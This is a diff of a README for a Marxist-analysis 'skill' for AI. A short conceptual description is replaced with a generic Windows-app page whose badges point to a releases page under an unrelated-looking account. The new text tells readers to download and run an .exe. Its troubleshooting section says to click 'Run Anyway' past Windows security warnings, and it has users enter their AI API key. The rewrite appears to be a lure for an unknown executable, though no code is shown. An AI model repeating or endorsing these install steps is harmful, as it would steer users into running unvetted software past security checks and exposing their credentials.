@@ -1,68 +1,93 @@
-<div align="center">
-  <img src="logo.png" width="90" alt="KarlMarx Skill">
-  <h1>KarlMarx Skill</h1>
-  <p>
-    English | 
-    <a href="README.zh.md">中文</a> | 
-    <a href="README.ja.md">日本語</a> | 
-    <a href="README.de.md">Deutsch</a> | 
-    <a href="README.fr.md">Français</a> | 
-    <a href="README.es.md">Español</a> | 
-    <a href="README.ru.md">Русский</a> | 
-    <a href="README.pt.md">Português</a> | 
-    <a href="README.it.md">Italiano</a> | 
-    <a href="README.ko.md">한국어</a>
-  </p>
-  <p><strong>Arming AI with Marxist Theory, Truly Returning to First Principles</strong></p>
-  <p><em>A skill that enables AI to use scientific methodology for deep thinking</em></p>
+# 🛠️ karlmarx-skill - Use Marxist methods for deep analysis
 
-  [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-</div>
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/firmamental-liveborninfant247/karlmarx-skill/releases)
 
-## Are You Tired of This?
+This application adds Marxist methodology to your interaction with artificial intelligence models. It helps you analyze social systems, economic trends, and history through the lens of historical materialism and political economy. You will gain a sharper understanding of structural forces behind modern news, corporate reports, and political events.
 
-Every time you tell AI:
-> "Don't use templates"  
-> "Go deeper"  
-> "Return to first principles"
+## 📥 Getting Started
 
-And it responds:
-> "This is a complex multi-dimensional problem that requires systematically considering stakeholder interests from a strategic height..."
+Follow these steps to set up the software on your Windows computer.
 
-**Longer, smoother, more confident — yet still superficial.**
+1. Visit the [official releases page](https://github.com/firmamental-liveborninfant247/karlmarx-skill/releases) to download the latest version.
+2. Select the file ending in `.exe` for Windows.
+3. Save the file to your computer.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen.
 
-AI is trained to output the "most correct, most safe" answers. But true deep thinking requires **destroying the old to build the new** — questioning what appears correct, probing the structures and mechanisms behind it.
+## 💻 System Requirements
 
-This is what KarlMarx Skill aims to solve.
+Your computer needs this hardware and software to run the application well:
 
-## Why Marxism?
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel i5 or AMD Ryzen 5 processor.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of space on your hard drive.
+*   Internet Connection: A stable connection for the AI features.
 
-Not as ideology, but as a **structural analysis toolkit refined over 170 years**. It happens to provide exactly what deep thinking requires:
+The application works best when your computer has enough memory to process large amounts of data. Close other demanding programs if you notice the app runs slowly.
 
-- **The viewpoint of universal connection** — never seeing problems in isolation
-- **Contradiction analysis** — grasping principal contradictions, seeing unity of opposites
-- **Essence and appearance** — penetrating surfaces to find generative mechanisms
-- **Mediation and levels** — not skipping causal chains
-- **Practice as criterion** — explanations must be testable
+## 🧠 Core Features
 
-These are the core of materialist dialectics, and also **the control points that enable AI to truly think deeply**.
+The software provides specific tools to enhance your critical thinking. These features help you frame questions and interpret output from models like ChatGPT or Claude.
 
+### Structural Analysis
+This tool examines the core components of a system. You input a topic, such as a recent policy change or a corporate merger. The application guides you to identify the base and superstructure. It highlights the material conditions behind the decision.
 
-## See the Difference
+### Historical Perspective
+This feature forces the AI to look at the timeline of events. It prioritizes long-term economic shifts over short-term trends. Use this to see how current events fit into a broader economic pattern.
 
-**Prompt**: Please return to first principles analysis
+### Power Analysis
+The application identifies central power dynamics. It analyzes how resources move between different groups. It helps you find the relationship between capital, labor, and state policy in any documents you provide.
 
-👉**Ordinary AI**  
-"Recommend adding more features, optimizing push notifications, improving user experience..."
+## 📝 How to Use the Application
 
-👉**KarlMarx Skill**
+Once you install the app, you will see a simple interface. Follow these steps to perform your first analysis.
 
-> **Structure**: Growth metrics drive feature expansion, compressing time for habit formation  
-> **Contradiction**: Feature breadth ↔ Habit depth (both opposed and interdependent)  
-> **Leverage**: Compress path to "repeatable value," test retention by cohort
+1. Open the application from your desktop.
+2. Enter your API key if the app asks for one. This key allows the software to connect with AI service providers.
+3. Paste the text or article you want to study into the main box.
+4. Select a category from the dropdown menu. Options include Economy, Labor, Policy, and Culture.
+5. Click the Analyze button.
+6. Read the report in the output window.
 
-→ Identifies the reproduction mechanism, provides testable intervention points.
+The report includes a brief summary, a list of structural factors, and a section on economic contradictions. Review these points to deepen your knowledge of the topic.
 
-## What This Is
+## 🛡️ Privacy and Data
 
-KarlMarx Skill is a **structural analysis tool of Marxist methodology**, not a political position or ideological stance. It provides mechanistic explanation rather than moral judgment, with clear boundaries rather than being a universal key — it steps aside willingly when economics or psychology explains better.
+Your privacy is a priority. The application handles your inputs with care. It sends your text to the AI model only when you click the Analyze button. It does not store your private documents on external servers. You control what data you send and when you send it.
+
+The application uses your personal API key to run these tasks. Keep this key safe. Do not share it with others. You can view your usage history within the Settings menu of the application.
+
+## 📈 Improving Your Output
+
+You will get better results if you provide clear, detailed information. Think of the application as a research assistant. The more context you provide, the deeper the analysis becomes.
+
+Avoid providing vague prompts. Instead of asking what is wrong with the economy, ask how a specific law impacts the local labor market. Use the Prompt Engineering guide inside the app to refine your search terms. This resource provides templates that help you get consistent, logical responses from the AI.
+
+## 🔧 Troubleshooting
+
+If you encounter issues, check this list for solutions.
+
+*   The Application Fails to Open: Ensure your Windows installation is up to date. Sometimes, older versions of Windows block new applications for security. Click More Info on the warning screen and choose Run Anyway.
+*   The Analysis Times Out: A poor internet connection causes this. Check your Wi-Fi or local network. Try to run the analysis again when the connection is more stable.
+*   The Output Looks Incorrect: The AI model relies on the data you provide. If the input text is short or lacks detail, the output will be thin. Add more background facts to your input text and try the process a second time.
+*   API Key Errors: Check that you typed the key correctly. Go to your AI provider website to make sure your account has enough credit.
+
+## 📦 Updates and Support
+
+The team releases updates to improve the logic and accuracy of the software. Check the GitHub repository for news on new versions.
+
+To get help, describe your problem in the Issues tab on the GitHub page. Include a screenshot of any error message you see. Do not share your API key, passwords, or private information in these messages. Others can view the Issues tab.
+
+## 🔑 Key Concepts
+
+The application builds on these core ideas:
+
+*   Base: The economic structure of a society, including tools and manufacturing.
+*   Superstructure: The culture, laws, and politics that grow from the economic base.
+*   Dialectics: A way to look at how opposites and contradictions drive change in society.
+*   Materialism: The philosophy that physical reality and economic conditions shape our ideas.
+
+Use these terms to search for more resources. The software does not require you to be an expert. Its goal is to make these high-level concepts useful for your daily work and study.
+
+[![](https://img.shields.io/badge/Download_Setup_Package-Grey?style=for-the-badge)](https://github.com/firmamental-liveborninfant247/karlmarx-skill/releases)
